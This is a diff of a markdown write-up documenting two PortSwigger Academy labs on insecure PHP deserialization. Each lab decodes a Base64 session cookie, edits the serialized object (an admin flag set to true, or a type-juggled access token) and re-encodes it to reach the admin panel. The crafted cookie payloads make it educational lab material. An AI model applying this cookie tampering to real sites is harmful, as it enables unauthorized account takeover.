@@ -51,45 +51,52 @@ If a website deserializes data that comes from the user, it can be dangerous. be
 ### Labs
 Just for demostration, I completed a couple of labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#insecure-deserialization) to show what this vulnerability can lead to:
 
-#### Modifying serialized objects 
+#### 1. Modifying serialized objects 
 In this instance, I will try editing the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.  
-Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
+<details markdown="1">
+  <summary>Click me to expand the process</summary>  
+1. Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
 ~~~
 Session Cookie: Tzo0OiJVc2VyljoyOntzOjg6lnVzZXJuYW1lljtzOjY6lndpZW5lcil7czo1OiJhZG1pbil7YjowO30
 Decoding Result: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
 ~~~
 
-Then I notice there's admin parameter, I modify the serialized object by changing `'admin;b:0'` to `'admin;b:1'`, granting admin privileges.  
+2. I notice there's admin parameter, I modify the serialized object by changing `'admin;b:0'` to `'admin;b:1'`, granting admin privileges.  
 After that, re-encode the modified serialized data back into Base64 and use it as the new session cookie. 
 ~~~
 Serialized Object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;} 
 Encoding Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30g
 ~~~
 
-Send another `GET /my-account request` to the web application using Burp Repeater with the modified session cookie.  
+3. Send another `GET /my-account request` to the web application using Burp Repeater with the modified session cookie.  
 Once that's done I see a `GET /admin request` is captured in Burp Proxy, but initially returns 401 Unauthorized.  
-So I resend the `GET /admin request` with the modified session cookie by Burp Repeater. This time, it returns 200 OK, confirming admin access.
 
-#### Modifying serialized data types
+4. I resend the `GET /admin request` with the modified session cookie by Burp Repeater. This time, it returns 200 OK, confirming admin access.
+</details>
+
+#### 2. Modifying serialized data types
 In this instance, I edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.  
-Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
+<details markdown="1">
+  <summary>Click me to expand the process</summary>  
+1. Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
 ~~~
 Session Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqeGoxb2NpcHZreTFpZzE0bzF1ajV0Nmt5bHlpYnoweiI7
 Decoding Result: O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jxj1ocipvky1ig14o1uj5t6kylyibz0z";
 ~~~
 
-Then I modify the serialized data type by changing:  
- - "username";s:6:"wiener" > "username";s:13:"administrator"
- - "access_token";s:32:"jxj1oc..." > "access_token";i:0;
+2. Then I modify the serialized data type by changing:  
+   - "username";s:6:"wiener" > "username";s:13:"administrator"
+   - "access_token";s:32:"jxj1oc..." > "access_token";i:0;
 
-Re-encode the modified serialized data back into Base64 and use it as the new session cookie.
+3. Re-encode the modified serialized data back into Base64 and use it as the new session cookie.
 ~~~
 Serialized Object: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
 Encoding Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
 ~~~
 
-I decide to use different approach from the previous instance. Instead of using Burp Repeater, I insert the encoded modified cookie session from the developer tool. 
-- Right click on the page > Inspect > Application > Cookies > Paste the cookie into "Value"
-  - Value: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
+4. I decide to use different approach from the previous instance. Instead of using Burp Repeater, I insert the encoded modified cookie session from the developer tool. 
+   - Right click on the page > Inspect > Application > Cookies > Paste the cookie into "Value"
+   - Value: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
  
-Once that's done, refresh the page, and we will access the admin account. I then navigate to admin panel and delete user "carlos" account.
+5. Once that's done, refresh the page, and we will access the admin account. I then navigate to admin panel and delete user "carlos" account.
+</details>
